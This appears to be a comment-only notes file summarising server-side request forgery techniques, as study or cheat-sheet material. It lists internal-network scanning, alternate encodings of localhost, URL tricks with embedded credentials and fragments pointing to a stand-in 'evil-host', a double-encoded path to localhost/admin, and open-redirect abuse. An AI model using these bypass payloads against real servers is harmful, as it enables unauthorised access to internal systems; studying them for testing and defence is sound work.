// Serve Side Request Forgery
//! Exploiting
//* can be used to :
// scan the local addresses to see if any other systems are running on 192.168.0.X:8080
//! Filter Bypass
//* localhost equivalents
// 127.0.0.1
// 127.1
// 2130706433 (decimal)
// 0x7F000001 (hex)
// 017700000001 (octal)
// 0.0.0.0
// 0
//* added creds
// https://expected-host:fakepassword@evil-host =>  https://evil-host
//* hashtags
// https://evil-host#expected-host => https://evil-host
//* added creds + hashtags
// http://localhost#@whitelist/admin
// in here the first parser thinks that localhost# is a username
// but when the request is made what's after the # is just deleted and the request is made to localhost
// resolving into http://localhost/admin
// note : you need to encode the # 2 tiems in order for this to work
// because the first parser consider # a part of the name beacuse he see it encoded
//* redirects (not static)
// you need to find how the application handles redirects
// /product/nextProduct?&path=http://evil-user.net => http://evil-user.net
//* other
// double encoding chars
// case variation
//? for more examples
// https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md